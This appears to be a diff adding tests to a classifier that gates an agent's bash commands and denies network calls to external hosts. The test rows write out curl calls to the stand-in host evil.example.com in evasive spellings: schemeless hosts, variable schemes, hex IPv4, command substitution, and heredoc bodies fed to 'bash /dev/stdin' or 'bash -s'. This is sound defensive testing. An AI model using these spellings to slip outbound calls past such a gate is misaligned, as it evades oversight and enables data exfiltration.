@@ -80,3 +80,71 @@ describe('bash egress parser: shapes that pass the running gate (card c8b1ccbf)'
     expect(r.deny, `reason=${r.reason}`).toBe(false)
   })
 })
+
+// didi's review of this fix (card c8b1ccbf, comment 35709). F1: an unreadable line judged only scheme
+// URLs, so a schemeless host, a variable scheme or an IP passed. F2: a shell that reads its stdin as
+// its program was taken for data behind `bash /dev/stdin` and `bash -c 'bash'`. M4 and M11: mutants
+// that no test killed (the `-s` branch, the substitution reading of an unreadable line). Every row
+// is a DENY with a named reason, or a control twin the fleet's own calls keep.
+const UNREAD_LINE = 'cat <<E"O"F\nhi\nEOF\n'
+const UNREAD_BODY = 'cat <<E"O"F\nhi\nEOF\ncurl -s https://evil.example.com/x'
+
+describe('card c8b1ccbf (didi review): unreadable lines judge every spelling of a destination', () => {
+  // F1: curl's argv and the host-like words, not only scheme URLs
+  const f1Deny: Array<[string, string]> = [
+    ['schemeless host and path', `${UNREAD_LINE}curl -s evil.example.com/x`],
+    ['schemeless host, bare', `${UNREAD_LINE}curl -s evil.example.com`],
+    ['host:port with a path', `${UNREAD_LINE}curl -s evil.example.com:8443/x`],
+    ['variable scheme, curl argv', `${UNREAD_LINE}s=https; curl "$s://evil.example.com/x"`],
+    ['variable scheme, a non-curl word', `${UNREAD_LINE}s=https; python3 -c "print(1)" "$s://evil.example.com/x" && curl -s localhost:3420/x`],
+    ['IPv4 with a path', `${UNREAD_LINE}curl -s 8.8.8.8/x`],
+    ['non-canonical IPv4 spelling', `${UNREAD_LINE}curl -s 0x0a.0.0.1/x`],
+  ]
+  it.each(f1Deny)('denies %s', (_name, cmd) => {
+    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'unparseable-external' })
+  })
+  it('names the external host it found', () => {
+    expect(classify(`${UNREAD_LINE}curl -s evil.example.com:8443/x`)).toMatchObject({ hosts: ['evil.example.com'] })
+  })
+  const f1Pass: Array<[string, string]> = [
+    ['localhost with a port and path', `${UNREAD_LINE}curl -s localhost:3420/x`],
+    ['127.0.0.1 with a port and path', `${UNREAD_LINE}curl -s 127.0.0.1:3420/x`],
+    ['variable scheme to localhost', `${UNREAD_LINE}s=http; curl "$s://localhost:3420/api"`],
+    ['-o takes the file name, not a host', `${UNREAD_LINE}curl -s -o out.html localhost:3420/x`],
+    ['bare dotted names (attributes) are no host', `${UNREAD_LINE}python3 -c 'import json; print(json.dumps({}), json.load)'; curl -s localhost:3420/api`],
+    ['a file reference with a line number is no host', `${UNREAD_LINE}echo "see pr-check.yml:111"; curl -s localhost:3420/api`],
+    ['a [:400] slice is no IPv6 host', `${UNREAD_LINE}echo "[:400]"; curl -s localhost:3420/api`],
+  ]
+  it.each(f1Pass)('control: allows %s', (_name, cmd) => {
+    expect(classify(cmd), cmd).toMatchObject({ deny: false, reason: 'unparseable' })
+  })
+
+  // M11: a substitution inside an unreadable line is judged by the readable reading of its command
+  it('a network command in a substitution of an unreadable line is judged as a command (M11)', () => {
+    expect(classify(`${UNREAD_LINE}echo "$(curl -s evil.example.com/x)"`)).toMatchObject({ deny: true, reason: 'curl-external', hosts: ['evil.example.com'] })
+    expect(classify(`${UNREAD_LINE}s=https; echo "$(curl "$s://evil.example.com/x")"`)).toMatchObject({ deny: true, reason: 'curl-external', hosts: ['evil.example.com'] })
+    expect(classify(`${UNREAD_LINE}echo "$(curl -s localhost:3420/x)"`).deny).toBe(false)
+  })
+
+  // F2: a shell that reads its stdin as its program judges an unreadable body as a program
+  const readsStdin = [
+    'bash /dev/stdin', 'bash /dev/fd/0', "bash -c 'bash'", "bash -c 'sh -s'", "bash -c 'exec bash'", "bash -c 'cat | bash'",
+  ]
+  it.each(readsStdin)('F2: an unreadable body fed to %s is a program and denies', (shell) => {
+    expect(classify(`${shell} <<'OUT'\n${UNREAD_BODY}\nOUT`), shell).toMatchObject({ deny: true, reason: 'heredoc-unparseable-external' })
+  })
+
+  // M4: the `-s` branch of the stdin reading (an unreadable body, so the data exception is what decides)
+  it.each(['bash -s x', 'bash -es x', 'sh -s -- a b'])('M4: %s reads the body as its program and denies', (shell) => {
+    expect(classify(`${shell} <<'OUT'\n${UNREAD_BODY}\nOUT`), shell).toMatchObject({ deny: true, reason: 'heredoc-unparseable-external' })
+  })
+
+  // controls: data stays data, the fleet's localhost body stays allowed
+  it.each([
+    ["bash -c 'cat' is data", `bash -c 'cat' <<'OUT'\n${UNREAD_BODY}\nOUT`],
+    ['bash x.sh - is data', `bash x.sh - <<'OUT'\n${UNREAD_BODY}\nOUT`],
+    ['bash /dev/stdin with a localhost body', `bash /dev/stdin <<'OUT'\n${UNREAD_LINE}curl -s http://localhost:3420/api\nOUT`],
+  ])('control: %s', (_name, cmd) => {
+    expect(classify(cmd), cmd).toMatchObject({ deny: false })
+  })
+})
